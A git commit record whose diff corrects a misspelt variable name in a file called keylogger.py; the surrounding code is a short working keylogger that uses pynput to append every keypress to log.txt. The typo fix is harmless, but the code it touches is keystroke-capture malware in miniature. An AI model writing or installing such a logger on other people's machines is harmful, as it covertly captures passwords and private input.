fc524a96ee1349d20f1616795d2ae780fafc3a55
A2509 <markarlgh@gmail.com>
2022-10-12 21:32:27 +0000

    111

--- keylogger.py
+++ keylogger.py
@@ -5,8 +5,8 @@ def press(key):
     with open("log.txt", 'a') as log:
         log.write(str(key))
 
-listner = pynput.keyboard.Listener(on_press=press)
+listener = pynput.keyboard.Listener(on_press=press)
 
-with listner:
-    listner.join() 
+with listener:
+    listener.join() 
 
